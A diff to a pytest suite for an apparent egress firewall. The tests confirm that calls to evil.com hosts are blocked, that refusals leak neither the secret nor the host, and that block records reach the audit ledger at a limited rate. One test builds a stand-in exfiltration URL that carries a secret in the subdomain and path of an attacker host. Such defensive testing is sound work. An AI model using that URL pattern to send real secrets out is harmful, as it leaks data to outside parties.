@@ -136,8 +136,8 @@ async def test_the_refusal_echoes_no_part_of_the_call_and_the_ledger_keeps_only_
     response = await send(h, token, url=f"https://{SECRET}.collector.evil.com/{SECRET}")
     body = json.dumps(response.body)
     assert refused(response) and SECRET not in body and "evil" not in body
-    blocks = [r for r in h.audit.get_recent(50) if r["firewall_decision"] == "BLOCK"]
-    assert len(blocks) == 1 and "evil.com" in json.dumps(blocks[0]["policy_violation_reasons"]) and SECRET not in json.dumps(blocks[0]["policy_violation_reasons"])
+    blocks = [r for r in h.full_rows(50) if r["decision"] == "BLOCK"]
+    assert len(blocks) == 1 and "evil.com" in json.dumps(blocks[0]["reasons"]) and SECRET not in json.dumps(blocks[0]["reasons"])
 
 
 @pytest.mark.parametrize(
@@ -206,12 +206,12 @@ async def test_refusals_reach_the_ledger_once_a_minute_and_are_always_counted_wi
     assert refused(await send(h, token, month="b"))  # the budget's refusal: its own ledger record
     for _ in range(40):
         assert refused(await send(h, token, url="https://evil.com/"))
-    blocks = [r for r in h.audit.get_recent(200) if r["firewall_decision"] == "BLOCK"]
+    blocks = [r for r in h.full_rows(200) if r["decision"] == "BLOCK"]
     assert len(blocks) == 2  # one for the budget, one for the destination: neither silenced the other
     assert 'reason="destination_not_allowed"} 40' in h.gateway.metrics.render()
     h.gateway._destination_refusal_logged[next(iter(h.gateway._destination_refusal_logged))] -= 61.0
     await send(h, token, url="https://evil.com/")
-    assert len([r for r in h.audit.get_recent(200) if r["firewall_decision"] == "BLOCK"]) == 3
+    assert len([r for r in h.full_rows(200) if r["decision"] == "BLOCK"]) == 3
 
 
 async def test_calls_refused_earlier_are_not_checked() -> None:
